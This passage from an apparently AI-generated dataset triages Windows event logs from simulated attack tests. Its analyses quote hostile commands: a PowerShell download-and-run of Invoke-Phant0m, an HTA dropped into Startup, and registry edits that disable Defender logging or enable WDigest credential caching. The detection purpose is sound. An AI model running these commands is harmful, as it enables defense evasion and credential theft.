   - Several Sysmon Event ID 5 logs indicate process creation of `wevtutil.exe` and `conhost.exe`.
   - Event ID 1 shows the invocation of `whoami.exe` and `hostname.exe`, and especially concerning is `powershell.exe` with a script to download and execute.

3. **Security Log:**
   - Security events like Event ID 4624 and 4672 show logins and privilege escalations. Specifically, privilege escalation grants the admin user a wide array of permissions: `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which can be a sign of privilege abuse.

4. **PowerShell Log:**
   - Evidence of PowerShell being executed with a command to set the execution policy and download a script from a GitHub repository: 
     ```
     Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
     $url = ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1""
     $output = ""$env:TEMP\\Invoke-Phant0m.ps1""
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($url, $output)
     Import-Module .\\Invoke-Phant0m.ps1
     Invoke-Phant0m
     ```

5. **Application Log:**
   - Security product state is on, as indicated by Windows Defender logs. However, the existence of malicious activity suggests potential evasion of detection by Windows Defender.

### Analysis & Indicators:

- **Indicators of Malicious Activity:**
  - The PowerShell activity is highly suspicious and aligns with execution of potentially malicious scripts. The script `Invoke-Phant0m` is used to hide processes from Windows Task Manager, a known tactic used by attackers to mask malicious operations.
  - Downloading and executing scripts from external repositories (GitHub) directly using PowerShell is considered an indicator of compromise unless definitively known to be benign by policy or specific function.
  - The account `admin_test` triggers concerns due to its operations with `wevtutil.exe` and `conhost.exe`, along with `powershell.exe` using high integrity, which shows the potential misuse.

### Resolution:

- **Resolution:** MALICIOUS

### Guidance:

1. **Immediate Action Required:**
   - Quarantine the host (`Server002`) to prevent further potential malicious activity.
   - Investigate the admin account (`admin_test`) for unauthorized use.
   - Review network activity and correlate any communications associated with external IPs or domains linked to malicious activity.
   - Collect forensic evidence: memory dump, current process list, and running services for further analysis.

2. **Long-term Recommendations:**
   - Strengthen logging and monitoring, particularly for PowerShell executions and privilege elevations.
   - Educate and train staff on recognizing potentially malicious activities such as unexpected script downloads and execution.
   - Perform a security audit and review current permissions on accounts with elevated privileges.
   - Consider implementing stricter PowerShell execution policies and monitoring solutions that analyze command-line arguments more diligently.

By taking these steps, the organization can mitigate immediate threats and enhance endpoint security to prevent future similar incidents."
Msiexec.exe - Execute Local MSI file with an embedded DLL,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior

1. **PowerShell Execution:**
   - Several events indicate the execution of PowerShell with the command line argument `-nop -Command Write-Host CustomAction export executed me; exit`, suggesting a potentially suspicious action being executed.
   - The usage of `-nop` (NoProfile) and `-Command` flags can indicate attempts to bypass traditional execution policies, often seen in malicious activities.

2. **Installation Activity:**
   - The sequence of events involving `msiexec.exe` indicates an unattended or silent installation (`/q /i`) from a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_DLL.msi`. This behavior is unusual, especially when acting on a temporary path, which can suggest a payload delivery through an MSI package.

3. **High Integrity Processes and Privilege Escalation:**
   - The logs show processes executed with a high integrity level, and there's an existence of events indicating the assignment of special privileges (Event ID 4672) such as `SeDebugPrivilege`, which enables debugging programs—a common privilege leveraged for malicious activities.

4. **EdgeUpdate Anomalies:**
   - Numerous executions of processes related to `Microsoft Edge Update`, including temporary directories and various parameters, could imply either routine updates or suspicious activity camouflaged as updates.

#### Indicators of Malicious Activity or Compromise

- **Command Line Execution Patterns:**
  - Execution of command lines and processes from non-standard directories or temporary paths, especially with PowerShell and msiexec.exe, raises suspicion of potential malware installation or execution.

- **Usage of PowerShell with Suspicious Flags:**
  - The combination of `-nop` flag with custom commands is a tactic often used to evade detection by traditional security solutions.

- **Temporary Directory Executions and Silent Installations:**
  - Actions performed silently and installations from unusual directories align with common tactics for malware persistence or execution.

#### Conclusion and Guidance

**Resolution: SUSPICIOUS**

While there is no definitive evidence in the logs of confirmed malicious activity, the observed behavior matches several indicators often associated with malicious tactics:

- Custom PowerShell executions with suspicious commands and flags,
- Silent MSI installations from temporary directories,
- Numerous high-integrity process executions,
- EdgeUpdate operations exhibiting atypical patterns.

**Guidance:**
- Further investigation should be initiated to verify the nature and origin of these events.
- Monitor the affected host for additional suspicious activities or unusual network communications.
- Consider isolating the host until a thorough investigation is completed.
- Review and potentially update security policies to block execution of scripts with uncommon flags and installation from temporary paths.
- Conduct forensic analysis of the host to identify potential compromise roots and remediate accordingly."
Mshta Executes Remote HTML Application (HTA),"Upon analyzing the provided Windows event logs, here's a detailed breakdown and analysis:

### Windows PowerShell Log:
- **Suspicious Execution**:
  - A PowerShell command is observed executing an `Invoke-WebRequest` to download a file from a remote URL: `https://raw.githubusercontent.com/file/file-file/master/files/data.005/src/data.005.hta`.
  - The downloaded file is then saved to the Windows Startup folder, which ensures execution upon system reboot: `$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\data.005.hta`.
  - `mshta` is used to execute the HTA file, a known technique for running potentially malicious scripts.
  - The script includes a command to forcefully stop the ""calculator"" process, though not inherently malicious, it indicates script capabilities.
- The behavior of downloading and executing scripts from an external source using PowerShell and then executing it via `mshta` is notably associated with malicious activity or malware distribution methods.

### Application Log:
- Normal application updates observed, particularly related to Microsoft Edge Updates, which are benign in isolation. 

### System Log:
- Standard system logs without notable suspicious activities. Time synchronization and system time change logs belong to normal system operations.

### Security Log:
- Contains routine logs associated with time change activities under `svchost.exe`, tied to the LOCAL SERVICE account, seemingly part of normal operations.

### Sysmon Log:
- **Potential Malicious Indicators**:
  - The consistent connection between PowerShell, `mshta.exe`, and the downloaded script indicate a chain of execution that aligns with common tactics, techniques, and procedures (TTPs) used by attackers for persistence.
  - Execution of `cmd.exe` to run `calc.exe` could be a test or standard malware behavior using benign payloads for testing execution paths.

### Assessment:
There is evidence of potentially **MALICIOUS** activity due to the behavior exhibited in the PowerShell logs. The use of PowerShell to download, save, and execute an HTA file using `mshta.exe` from an external domain does raise significant red flags. This technique is often used in initial access vectors or for establishing persistence on a compromised system.

### Recommendation:
1. **Immediate Actions**:
   - Isolate the affected host (Server002) to prevent potential spread.
   - Perform a thorough endpoint scan using an updated anti-malware tool.
   - Investigate the downloaded content and any modifications or persistence mechanisms.
   
2. **Further Investigation**:
   - Review network logs for any unauthorized access to external IPs or unexpected traffic to/from the specific GitHub URL.
   - Cross-reference with threat intelligence feeds to gather context about the source URL.
   - Conduct user session analysis on SERVER002 to determine potentially compromised accounts.

3. **Remediation**:
   - Remove the HTA file from the Startup directory and any related scripts.
   - Patch and update systems with the latest security updates.
   - Educate users about suspicious activities involving PowerShell and external scripts."
Windows - Modify file last access timestamp with PowerShell,"After reviewing the provided logs for potential indicators of malicious activity, the following observations and analysis have been made:

### Suspicious Behavior Detected:

1. **PowerShell Timestomping Activity:**
   - The PowerShell log shows a command using `Get-ChildItem` combined with a script that modifies the `LastAccessTime` of a file (`data.006_timestomp.txt`) to `01/01/1970 00:00:00`. This is a technique known as ""timestomping,"" which is often used by attackers to hide evidence of malicious activity by altering file timestamps.

2. **Frequent Execution of Windows Command-Line Tools:**
   - The Sysmon logs indicate a sequence of command-line tool executions, including `whoami.exe`, `HOSTNAME.EXE`, and multiple invocations of `conhost.exe`. This behavior, in itself, is not inherently malicious, but combined with the timestomping activity, it raises suspicions of reconnaissance or privilege checking potentially by an unauthorized actor.

3. **Execution Context and User:**
   - Actions were carried out under the user `SERVER002\\admin_test` with a high integrity level, indicating administrative privileges. The frequency and coordination of these activities suggest a potential misuse of elevated privileges.

### Potential Risks:

- The presence of timestomping suggests attempts at anti-forensic activities, which could be part of a larger effort to conceal unauthorized actions or malware on the host.
- The execution of various system utilities within a short time frame could indicate scripts executed for system enumeration or preparation for a secondary phase of an attack.

### Recommendation:

Given the analysis above, the situation is classified as **SUSPICIOUS**. 

### Guidance on How to Proceed:

1. **Immediate Containment:**
   - Isolate the affected system from the network to prevent potential lateral movement or exfiltration of data.

2. **Detailed Investigation:**
   - Conduct a full forensic analysis on the server to examine all activities around the time of the detected suspicious behavior.
   - Gather additional logs (network, AV, EDR) for correlation and a broader understanding of the scope.

3. **System Audit and Hardening:**
   - Review and audit permission settings, especially any recent changes.
   - Implement stricter PowerShell logging and execution policies to monitor and control script usage.

4. **User Behavior Monitoring:**
   - Investigate user `SERVER002\\admin_test` for any anomalies in login times, locations, or non-standard device usage.

5. **Review of Security Controls:**
   - Ensure all security patches are up to date and apply any pending updates.
   - Consider deploying advanced threat detection tools to enhance monitoring capabilities.

By adhering to these guidelines, the entity can mitigate potential threats and better protect its infrastructure against further attacks."
Disable Windows Error Reporting Settings,"## Detailed Analysis

### Security Log
1. **Event ID 4616** indicates changes in system time, both events logged within milliseconds:
   - **Details**: 
     - This action was done by a process `C:\Windows\System32\svchost.exe` with the account `LOCAL SERVICE`.
     - **Comment**: Changing system time can indicate malicious activity such as attempts to alter log timestamps. However, in this case, it's done by a legitimate system process (`svchost.exe`) under the `LOCAL SERVICE` account. Therefore, it seems part of regular system functions.
   
2. **Event ID 4634** indicates a logoff event for the user `admin_test`.
   - **Details**: 
     - The `LogonType` is `3`, which typically means a network logon, corresponding to legitimate activity, often seen when services are initiated remotely.
   
3. **Event ID 4672** indicates special privileges were assigned to the user `admin_test`.
   - **Details**:
     - This includes privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are sensitive and can indicate risky behavior if misused.
   - **Comment**: This is not necessarily malicious on its own, as such privileges can be part of typical administrative tasks. Still, it requires correlation with other logs for context.

4. **Event ID 4624** indicates a successful logon by user `admin_test` using NTLM authentication.
   - **Details**:
     - The logon was from `DESKTOP-3HL5B2P`. The presence of the authentication process `NtLmSsp` is standard for NTLM-based logons.
     - **Comment**: This login from a workstation using NTLM is normal but has potential security implications if NTLM fallback is allowed across sensitive networks.

### Application Log
- **Event ID 16384** from `Software Protection Platform Service` does not indicate any immediate alarm; this pertains to standard service operations.

### System Log
- Various `Kernel-General` events show changes in the system time:
  - Done by `svchost.exe`. This supports the previous observation from the Security log indicating system maintenance activities rather than malevolent time alteration.

### Sysmon Log
1. **Process Execution**:
   - Multiple executions of administrative utilities (`wevtutil.exe`, `conhost.exe`, `cmd.exe`, `reg.exe`) by account `admin_test`:
     - **Noteworthy**: Command `cmd.exe` executing registry modifications to disable notifications in Windows Defender logs suspicious, especially when altering security settings. This can be interpreted as an attempt to hide other activities.
   - **Analytic Comment**: Disabling Defender notifications can be an indicator of preventively disabling security measures often associated with sophisticated attacks.

2. **Use of `wevtutil.exe`**:
   - This utility was executed several times, likely related to system or application logs viewing or exporting:
     - **Comment**: `wevtutil.exe` execution is noteworthy, especially if frequent; intended to access or clear logs.

### Assessment
- The logs identify the use of legitimate administrative tools by an admin account performing suspicious activities like disabling Defender notifications. While such actions can originate from legitimate administrative tasks, they may also represent attempts to evade detections or tamper logs.

### Resolution
**SUSPICIOUS**: The activities observed, particularly the registry modifications disabling Windows Defender notifications by `admin_test`, warrant further investigation. It would be advisable to:
- Review user `admin_test` recent activity and ensure it's authorized.
- Check for unusual out-of-hours logons or attempts.
- Validate the necessity of the administrative privileges requested.
- Investigate logs on `DESKTOP-3HL5B2P` workstation for corroborative activity.
- Assess network traffic around the log timestamps for any anomalies.

Consider escalating this for a more thorough review and validation from counterparts responsible for validating user actions and their needs to adjust system policies."
Disable Powershell ETW Provider - Windows,"Based on the provided log entries, I will analyze them for potential indicators of malicious activity.

### Analysis:

1. **Presence of PsExec Usage**: 
   - The logs indicate the use of the PsExec utility, which is commonly used by system administrators for legitimate purposes, such as remote process execution. However, PsExec can also be used by attackers for lateral movement and privilege escalation.
   - PsExec was executed with the command: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\pstools\\PsExec.exe"" -accepteula -i -s cmd.exe /c logman update trace ""EventLog-Application"" --p ""Microsoft-Windows-Powershell"" -ets"".`
   - The PsExec service (PSEXESVC) was registered as a service with ""demand start"" using `LocalSystem`, which suggests an attempt to execute commands with elevated privileges.

2. **PowerShell Execution**:
   - PowerShell is executed with a command involving PsExec, indicating automation or scripted control over system services: `powershell.exe & {cmd /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\pstools\\PsExec.exe"" -accepteula -i -s cmd.exe /c logman update trace ""EventLog-Application"" --p ""Microsoft-Windows-Powershell"" -ets}`.
   - The combined use of PowerShell and PsExec is indicative of sophisticated control, which may be benign in an administrative context but needs scrutiny in non-standard usage patterns.

3. **Unusual Activity and Persistence Mechanism**:
   - The installation and usage of the PSEXESVC service, which can be an indicator of establishing persistence or facilitating remote access, is worth noting.
   - The presence of the PsExec service without a clear administrative task or change noted in logs suggests potential unauthorized use.

4. **Edge Update Usage**:
   - Many Sysmon events involve the Microsoft Edge Update service. While the service is legitimate, the frequency and use, in combination with administrative PowerShell and remote tool execution, merit further scrutiny to ensure these updates were legitimate and expected.

### Assessment:
- **Indicators suggest suspicious usage patterns** with PsExec and PowerShell in conjunction. While this could very well be part of a legitimate administrative activity, the context and patterns cannot be ignored.

### Resolution:
- **SUSPICIOUS**: Based on the analysis above, the logs contain activities that are out of the ordinary for typical user behavior and indicate potential misuse of PowerShell and remote administration tools such as PsExec. This activity needs further investigation to confirm whether these were legitimate actions performed by authorized administrators or if they indicate a potential compromise or abuse of privileges.

### Guidance:
- Review and verify the authorization and purpose behind the use of PsExec and PowerShell commands.
- Cross-reference these log entries with known administrative changes or authorized personnel actions.
- Monitor further use of PowerShell and PsExec closely and consider enhancing logging or implementing restrictions based on job role.
- If no authorized cause for the actions is identified, conduct a deeper forensic investigation to check for any malicious intent or unauthorized access, including reviewing associated endpoint antivirus logs, network traffic, and unauthorized access attempts."
Regsvr32 local DLL execution,"Based on the provided log entries, let's conduct a detailed analysis for potential signs of suspicious or malicious activity:

1. **Windows Defender:**
   - Two log entries indicate that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), which is generally a positive sign implying basic endpoint protection is functioning.

2. **Edge Update Service:**
   - The Edge Update service is seen starting and stopping, which can be normal behavior for a scheduled update process. However, multiple entries for different instances of `MicrosoftEdgeUpdate.exe` and related setup and update files (`MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`) running in a short period are noted.
   - While rapid successive calls to update executables can occur, it's useful to verify if these updates match expected update schedules and versions.

3. **Suspicious DLL Registration:**
   - One Sysmon entry shows the registration of a potentially suspicious DLL (`AllTheThingsx86.dll`) using `regsvr32.exe`. This is particularly concerning because:
     - It is being registered from the user's temp directory, a common tactic for malicious actors to execute DLLs outside of typical controlled paths.
     - The command line involves conditional execution based on system architecture, often seen in crafted scripts for compatibility.

4. **Process Execution Pattern:**
   - The majority of Sysmon logs show processes executed by `user SERVER002\\admin_test`, which includes creation of `powershell.exe`, `whoami.exe`, `cmd.exe`, and `regsvr32.exe`. 
   - While use of utilities like `whoami` can be legitimate, combined with the registration of a DLL from a temp directory, it raises suspicion.

5. **Command Line Usage:**
   - The usage of command line, especially embedding with `-Embedding` by `wsmprovhost.exe` as a parent of certain processes (like `whoami.exe` and `cmd.exe`), can be expected in legitimate remote management tasks but warrants checking if consistent with standard operational procedures.

### Assessment and Resolution:

**Suspicious Activity Identified**

- The use of `regsvr32.exe` to register a DLL from the temporary directory is atypical and suggests further investigation.
- Activity involving `cmd.exe` and `regsvr32.exe` under a user account with high privileges could suggest attempts at compromising the system.
- It would be beneficial to check:
  - Filename and hash of `AllTheThingsx86.dll` against threat intelligence for known malicious signatures.
  - Establish if these commands, particularly around DLL registration, were executed by authorized scripts or users.

### Resolution: **SUSPICIOUS**

Given the potentially suspicious DLL registration activity and frequent updates by processes within a short duration, the logs warrant closer inspection. Further investigation with network logs, endpoint details, and user activity is advised to confirm or dispel concerns.

### Recommended Actions:

- Investigate `AllTheThingsx86.dll` and the command that registered it.
- Verify recent updates and changes in the update schedule of Edge.
- Validate the legitimacy of the user actions involving `SERVER002\\admin_test`.
- Ensure all suspicious files are scanned with updated threat intelligence tools."
SIP (Subject Interface Package) Hijacking via Custom DLL,"Based on the provided logs, let's analyze the potential indicators of suspicious or malicious activity on this Windows machine:

### Analysis:
1. **PowerShell Activity**:
    - There are multiple instances of PowerShell being invoked with specific scripts. PowerShell commands are a common vector for malicious activity due to their robust capabilities.
    - A PowerShell script is run with restricted execution policy, which is a good security practice; however, the command `$Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;` appears to attempt to read and possibly manipulate .inf files, which can be associated with driver installation activities.
    - Though the command seems benign and resembles a script to check for specific configurations, this does not completely negate the potential for abuse.

2. **Command Execution**:
    - The command `cmd.exe` executing a suspicious operation (`regsvr32.exe`) on a `GTSIPProvider.dll` located in a temporary directory can be problematic. Regsvr32 is often used by attackers to execute DLL files in a way that can bypass application whitelisting protections. The use of `regsvr32.exe` is often associated with malicious activity, especially when executed from a non-standard directory.
  
3. **Windows Updates and Edge Update Activities**:
    - There are frequent updates and interactions with EdgeUpdate, which, while potentially legitimate, can also be a vector for malware masking itself as legitimate update processes.
    - The presence of multiple `MicrosoftEdgeUpdate.exe` processes, including operations related to installations via EdgeUpdate, needs further scrutiny to ensure no tampered updates are present.

4. **Security Log Entries**:
    - Multiple successful logons with elevated tokens are recorded; these are typical system processes but require correlation with expected behavior.
    - Privilege assignments logged (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) to the `SYSTEM` account is typical but should be verified against expected system operations.

5. **Sysmon and Security Logs**:
    - Frequent process creation and parent-child relationships in the security logs predominantly involve typical Windows operations, however, activities around `CompatTelRunner.exe` (`Microsoft Compatibility Telemetry`) might need closer inspection to ensure no abuse of this telemetry data collection process, which has been in the past targeted for data collection by malware.

### Conclusion:
Given the context of the observed events, there are indicators of suspicious activity, particularly around the usage of `cmd.exe`, `regsvr32.exe`, and PowerShell commands interacting through temporary directories.

### Resolution: SUSPICIOUS

The logs contain potentially suspicious activities that warrant further in-depth investigation to ensure there is no underlying malicious action. It is recommended to:
- Conduct a detailed forensic investigation of the PowerShell scripts executed.
- Verify the integrity of the system, especially files involved in the `cmd.exe` and DLL registration process.
- Ensure all systems and applications are up-to-date with security patches.
- Monitor outgoing connections for unusual activity.

Further analysis should be directed towards understanding the source and purpose of the DLL and scripts executed, ensuring they are not malicious or unauthorized."
Modify RDP-Tcp Initial Program Registry Entry,"**Detailed Analysis of the Logs**

Upon analyzing the provided Windows event logs across the system, application, security, and Sysmon channels, several points stand out which warrant further investigation for potential malicious activity:

### Suspicious or Anomalous Behavior

1. **Time Change Events:**
   - There are multiple events related to the system time being set back a few seconds (EventID 24 & 1 in System Logs and EventID 4616 in Security Logs). This could potentially be legitimate system adjustments; however, consistent time changes could be indicative of an attacker trying to cover their tracks.

2. **Privilege Escalation:**
   - Event ID 4672 in the Security log shows the account ""admin_test"" acquiring multiple sensitive privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. Processes running with these elevated privileges can perform high-level actions, and this pattern is commonly exploited by attackers to maintain persistence or escalate their privileges further.

3. **Process Activity:**
   - The use of `wevtutil.exe` and `conhost.exe` in rapid succession from the Sysmon logs from the context of the user `SERVER002\admin_test` raises questions. `wevtutil` is a legitimate Windows binary for managing event logs, but it can be misused by attackers for clearing event logs or exporting them stealthily.
   - Several entries for the `cmd.exe` process executing registry changes in the Sysmon logs (`ProcessId: 5404`). The command modifies RDP-related registry keys (EventID 1), which could be indicating an attempt to backdoor or modify RDP configuration, possibly to facilitate unauthorized remote access.

4. **Edge Update Executions:**
   - There's a high volume of activity around `MicrosoftEdgeUpdate.exe` processes under the SYSTEM user (visible in Sysmon logs). While Edge automatically updates itself, the volume of Edge-related executions seems heavy. This might be benign if it's part of a standard update cycle, but it can also be a technique used by malware by masquerading or leveraging legitimate update services.

### Threats or Risks Identified
- **Potential Persistence or Evasion Techniques:** The manipulation of system time and elevated privilege usage are classic techniques for persistence and covering activities.
  
- **Privilege Escalation Risks:** The elevation of privileges obtained by the user `admin_test` poses a risk for data theft, system compromise, or further attacks.

- **Potential Backdoor or Configuration Changes:** Registry modifications to RDP settings hint towards potential changes in system behavior which could compromise security.

### Guidance on How to Proceed
- **Thorough Investigation of the `admin_test` Account:** Review activities associated with this user account for anomalies and ensure no unauthorized access. Investigate how it gained such elevated privileges.

- **Log Retention and Monitoring:** Ensure logs have not been tampered with by verifying integrity. Enhance monitoring of system time changes and events like event log modifications or privileged command executions.

- **RDP and System Settings Review:** Scrutinize RDP configurations and recent changes, verifying they align with known operations and security guidelines.

- **Review Legitimate Update Activities:** Cross-reference and validate the frequency and nature of Microsoft Edge updates on a standard machine to confirm benign activity or identify misuse.

**Resolution: SUSPICIOUS**
- The logs contain activity consistent with both regular system operations and potential misuse or malicious activity that requires further investigation to differentiate between the two. The potential risks presented justify a deeper dive into account activities, system configurations, and process behaviors to decisively categorize the nature of these activities."
LockBit Black - Disable the ETW Provider of Windows Defender -cmd,"To analyze the provided Windows event logs, we should focus on unusual process execution, suspicious command-line arguments, privilege escalation, and any signs of compromise.

### Detailed Analysis:

1. **Windows PowerShell, Application, Security, and System Logs:**
   - The provided logs contain entries only for the Application log associated with the Software Protection Platform Service and no logs from PowerShell, Security, or System categories, which limits the available context for a broader security analysis.

2. **Sysmon Logs:**

   - **Unusual Use of `wevtutil.exe`:**
     - Multiple instances of ""C:\\Windows\\System32\\wevtutil.exe"" being executed by the user `SERVER002\\admin_test` in quick succession. `wevtutil.exe` is a legitimate Windows utility used for retrieving and managing Windows event logs, but its use can also signal attempts to manipulate or clear event logs as part of malicious activity.

   - **`cmd.exe` and `reg.exe` Manipulating Registry:**
     - An execution of ""C:\\Windows\\System32\\cmd.exe"" with a command line performing a registry modification: 
       ```
       reg add ""HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational"" /v Enabled /t REG_DWORD /d 0 /f
       ```
     - This action appears to disable the Windows Defender Operational channel and can be indicative of an attempt to hinder security logging or functionality, which is suspicious.

   - **Execution of `whoami.exe` and `hostname.exe`:**
     - These are standard Windows utilities used for retrieving user and computer information. Their presence alone does not indicate anything malicious unless they are part of a known attack pattern or executed by a suspicious parent process—here, they originate from `wsmprovhost.exe`, which is a legitimate Windows process related to WSM providers.

   - **Repeated Execution of `conhost.exe`:**
     - ""C:\\Windows\\System32\\conhost.exe"" is executed multiple times. While `conhost.exe` is a legitimate part of the Windows console subsystem, the rapid and repetitive nature of these executions can be unusual without a clear context or purpose.

   - **High Integrity Level Execution:**
     - Processes are running with high integrity, indicating they have elevated privileges. This is noteworthy if these activities appear unjustified.

3. **Key Indicators of Concern:**
   - Registry modification disabling Windows Defender’s event logging is a strong indicator of suspicious activity.
   - The absence of context in the Application, Security, and System logs further complicates the assurance of benign activity.

### Assessment and Resolution:

Overall, the manipulation of the Windows registry related to Windows Defender logging, paired with the rapid execution of event-related utilities like `wevtutil.exe`, is suspicious. These actions, often seen in attack scenarios where an attacker tries to maintain persistence and hide their tracks, justify a closer examination to avoid potential threats.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Immediate Actions:**
   - Investigate the user `SERVER002\\admin_test` to verify if this account should have the executed privileges and activities.
   - Validate whether these actions correlate to any legitimate administrative tasks or automation scripts used within the organization.

2. **Monitoring and Mitigation:**
   - Enable heightened monitoring on `Server002` for further suspicious activities involving event manipulation or registry changes.
   - Review and revert any unauthorized registry changes, specifically related to security and operational logging.

3. **Review Security Configurations:**
   - Ensure that Windows Defender and other security tools’ logs and features are properly operational.
   - Conduct a full security playbook review to address potential gaps in monitoring and incident response strategies.

This recommendation should help in mitigating potential risks while gathering further evidence to ascertain the nature of these activities."
Add domain to Trusted sites Zone,"Upon analyzing the provided event logs from the Windows host, several key observations can be made regarding potential indicators of malicious activity:

1. **PowerShell Activity**:
   - There are multiple PowerShell events in the Windows PowerShell log indicating execution of a script. The script modifies the Windows registry keys related to internet settings by adding a domain (`bad-domain.com`) and a subdomain (`bad-subdomain`) to the `ZoneMap`. This action is commonly associated with malware attempting to circumvent security settings or add exceptions to security zones.
   
2. **Modification of Registry Entries**:
   - The script specifically sets properties like `https`, `http`, and `*` to the value `2` (which corresponds to Trusted Sites in Internet Explorer’s Zone Mapping). This could be used to lower security settings for certain domains, which is a suspicious action.
   
3. **PowerShell Context**:
   - The PowerShell script was executed in the context of `SERVER002\\admin_test`, a user with potentially elevated or administrative privileges, as suggested by the high integrity level of the process. This increases the risk associated with the script since it can potentially change system-wide settings.

4. **Observed EdgeUpdate Activity**:
   - A large number of entries related to Microsoft Edge Update processes are observed. While frequent updates with commands like `/regsvc`, `/regserver`, and `/svc` can be normal, depending on context, the volume and timing might need further investigation to rule out misuse.

5. **Sysmon Logs**:
   - Events show the execution of `MicrosoftEdgeUpdate.exe` related utilities, which align with normal behavior for an update service. 
   - Other processes like `svchost.exe`, `TiWorker.exe`, and `TrustedInstaller.exe` show up in the logs as performing typical Windows update and system processes. No overtly suspicious command-line arguments or paths were detected in these entries.

6. **Execution of Administrative Tools and Built-in Commands**:
   - There are entries showing the use of `whoami.exe`, `wevtutil.exe`, and `conhost.exe`, which admin users might typically use for system information and event log management. This, combined with other activities, can be suspicious if there is no legitimate reason for their use around the incident time.

### Assessment

From the given logs, the most significant indicator of potential compromise is the suspicious PowerShell activity modifying registry settings for untrusted domains, using elevated privileges.

### Conclusion: **MALICIOUS**

The logs contain definite signs of malicious activity primarily due to the PowerShell script potentially altering security settings via registry changes to include untrusted domains. This behavior aligns with known tactics used by malware to gain persistence or evade security controls.

### Recommendations:

1. **Immediate Response**:
   - Suspend the `SERVER002\\admin_test` user account and related processes to prevent further unauthorized activities.
   - Investigate any additional access attempts or associated accounts to determine the extent of the compromise.

2. **Additional Investigation**:
   - Check for additional logs or artifacts relating to the PowerShell command origin.
   - Investigate any files downloaded from or uploaded to `bad-domain.com`.

3. **Remediation**:
   - Perform a full antivirus and antimalware scan.
   - Reset impacted security configurations, specifically inspecting other changes in ZoneMap or equivalent settings.

4. **Prevention**:
   - Implement stricter execution policies for PowerShell scripts.
   - Consider additional logging and alerting around modifications to external site settings and PowerShell executions.
   - Review user accounts for least privilege and ensure strong, multifactor authentication measures are in place.

By acting on these recommendations, the potential impact can be mitigated and future incidents may be better prevented or detected."
Tamper with Windows Defender ATP using Aliases - PowerShell,"**Analysis of Windows Event Logs:**

1. **System Log Observations:**
   - A notable observation here is the adjustment in system time. Events [3570 and 3571] denote a time change via \`svchost.exe\`. While time adjustments can be valid for maintaining system time accuracy, they can also be used by attackers to manipulate time-based security mechanisms or logs.

2. **Sysmon Log Observations:**
   - There is frequent invocation of \`wevtutil.exe\` and \`conhost.exe\` by the user \`admin_test\`. This tool, \`wevtutil.exe\`, is legitimate for managing Windows event logs, its use should be justified via administrator activity.
   - The execution of commands with PowerShell showing \`Set-MpPreference\` commands could imply an attempt to alter Windows Defender settings, which is concerning and could indicate an effort to reduce system defenses:
     - `drtm`, `dbm`, `dscrptsc`, and `dbaf` are referenced within the context of PowerShell. They may refer to settings or parameters being modified in Windows Defender to disable certain protections like real-time monitoring.
   - The presence of repeated EdgeUpdate processes could be benign as they can be related to legitimate update installation or system maintenance tasks, although high frequency should be noted for analysis in broader context.

3. **Security Log Observations:**
   - Events indicate that the user \`admin_test\` had several privileged logons, possessing several high-level privileges. This in itself isn't malicious, but it enforces the need for scrutiny on the above-noted changes occurring under this account, especially with NTLMv2, which might suggest an external connection.
  
4. **Application Log Observations:**
   - The repeated ""Service stopped"" event, coupled with \`Windows Defender\` being set to a snoozed state, is a strong indicator of potentially malicious activity attempting to reduce system defense capabilities.

5. **Windows PowerShell Log Observations:**
   - The PowerShell log confirms the execution of commands potentially intended to disable or lower the security posture of the system, which were executed by \`admin_test\`.

**Assessment:**
- The signs of adjusting system time, subsequent logs stoppage activities, use of Windows event utility without justification, and attempts to weaken system defense via PowerShell, collectively indicate suspicious behavior.

**Resolution: SUSPICIOUS**
- The evidence suggests activities that do not align with typical and benign administration activities. Further investigation is warranted, particularly regarding the user \`admin_test\` and processes that modified system time, manipulated Windows Defender settings, and were associated with heavy EdgeUpdate activity, to determine if a malicious compromise has occurred. Immediate steps should be taken to secure logs, increase monitoring on this account, and ensure no further security settings have been altered."
Modify registry to store logon credentials,"Upon analyzing the provided Windows event logs from the machine labeled ""Server002,"" I've found the following observations that indicate potential malicious activity:

1. **Time Manipulation:** 
   - In the security and system logs, there are multiple Event ID 4616 entries which indicate a system time change. The time seems to be adjusted slightly backward, which can be a technique used by malicious actors to bypass certain security features or to manipulate log timestamps to confuse investigation efforts. While not inherently malicious by itself, it can be suspicious if not authorized or expected.

2. **Suspicious Use of WDigest:**
   - The Sysmon logs show a command (`cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`) executed under high integrity level using `reg.exe` to enable WDigest. Enabling this registry setting can potentially allow credentials to be stored in memory in clear text, making it a target for credential dumping attacks. This is a significant red flag as WDigest was disabled by default in newer Windows versions to enhance security.

3. **Use of PowerShell and Command Line Tools by ADMIN_TEST Account:**
   - Multiple events show `conhost.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` being executed by the `admin_test` account. Although the use of `whoami.exe` can be seen during legitimate troubleshooting, the context of its usage along with other command-line utilities may suggest reconnaissance activities often seen in lateral movements or preparation for privilege escalation.

4. **Pattern of Legitimate Software Updates:**
